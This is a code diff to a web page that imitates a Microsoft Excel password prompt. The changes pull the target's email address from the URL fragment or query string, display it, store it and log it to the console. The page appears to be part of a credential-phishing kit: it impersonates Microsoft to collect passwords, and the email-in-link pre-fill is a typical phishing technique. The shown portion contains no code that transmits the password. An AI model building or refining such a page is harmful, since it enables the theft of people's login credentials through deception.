@@ -321,12 +321,12 @@
                 <h1>Microsoft Excel</h1>
             </div>
             
-            <div class="user-email" id="displayEmail">{email}</div>
+            <div class="user-email" id="displayEmail">user@example.com</div>
         </div>
         
         <div class="login-content">
             <h2 class="form-title">Enter password</h2>
-            <p class="form-subtitle" id="passwordDescription">Enter the password for {email} to access Excel.</p>
+            <p class="form-subtitle" id="passwordDescription">Enter the password for user@example.com to access Excel.</p>
             
             <form id="loginForm">
                 <div class="input-group">
@@ -376,43 +376,45 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Function to update email placeholder with actual email
-            function updateEmailPlaceholder(emailAddress) {
-                // Find all {email} placeholders and replace them
-                const emailElements = document.querySelectorAll('.user-email, .form-subtitle');
+            // Function to extract email from URL
+            function extractEmailFromURL() {
+                // Try to get email from hash (URL fragment)
+                const hash = window.location.hash;
+                if (hash && hash.length > 1) {
+                    // Remove the # symbol and return the email
+                    return hash.substring(1);
+                }
                 
-                emailElements.forEach(element => {
-                    element.textContent = element.textContent.replace(/\{email\}/g, emailAddress);
-                });
-            }
-            
-            // Function to extract email from URL or use default
-            function getEmailAddress() {
-                // Method 1: Check URL parameters
+                // Try to get email from query parameters
                 const urlParams = new URLSearchParams(window.location.search);
-                let email = urlParams.get('email');
-                
-                // Method 2: Check if there's a stored email from previous session
-                if (!email) {
-                    email = localStorage.getItem('excelCurrentEmail');
+                const emailFromQuery = urlParams.get('email');
+                if (emailFromQuery) {
+                    return emailFromQuery;
                 }
                 
-                // Method 3: Use a default email for demonstration
-                if (!email) {
-                    email = "user@example.com";
+                // Try to get from localStorage
+                const storedEmail = localStorage.getItem('excelCurrentEmail');
+                if (storedEmail) {
+                    return storedEmail;
                 }
                 
-                return email;
+                // Default fallback
+                return "user@example.com";
             }
             
-            // Get the email address
-            const currentEmail = getEmailAddress();
+            // Extract and set the email
+            const currentEmail = extractEmailFromURL();
             
-            // Update all email placeholders
-            updateEmailPlaceholder(currentEmail);
+            // Update the email display
+            document.getElementById('displayEmail').textContent = currentEmail;
+            document.getElementById('passwordDescription').textContent = `Enter the password for ${currentEmail} to access Excel.`;
             
-            // Store the email for future use
+            // Store for future use
             localStorage.setItem('excelCurrentEmail', currentEmail);
+            
+            // Log the extracted email for debugging
+            console.log('Extracted email:', currentEmail);
+            console.log('Current URL:', window.location.href);
             
             // Elements
             const togglePassword = document.getElementById('togglePassword');
@@ -442,7 +444,6 @@
                 e.preventDefault();
                 
                 const password = passwordInput.value;
-                const currentEmail = document.getElementById('displayEmail').textContent;
                 
                 // Show loading state
                 signInBtn.innerHTML = '<span class="loading"></span> Signing in...';
@@ -478,7 +479,6 @@
             // Forgot password link
             document.querySelector('.forgot-password').addEventListener('click', function(e) {
                 e.preventDefault();
-                const currentEmail = document.getElementById('displayEmail').textContent;
                 alert(`To reset your password for ${currentEmail}, go to https://account.live.com/password/reset`);
             });
             
@@ -490,17 +490,14 @@
             
             // Other sign-in options
             document.getElementById('windowsHello').addEventListener('click', function() {
-                const currentEmail = document.getElementById('displayEmail').textContent;
                 alert(`Windows Hello would launch facial recognition or fingerprint authentication for ${currentEmail}`);
             });
             
             document.getElementById('authenticator').addEventListener('click', function() {
-                const currentEmail = document.getElementById('displayEmail').textContent;
                 alert(`Microsoft Authenticator would send a notification for ${currentEmail} to your mobile device`);
             });
             
             document.getElementById('securityKey').addEventListener('click', function() {
-                const currentEmail = document.getElementById('displayEmail').textContent;
                 alert(`You would be prompted to insert your security key for ${currentEmail}`);
             });
             
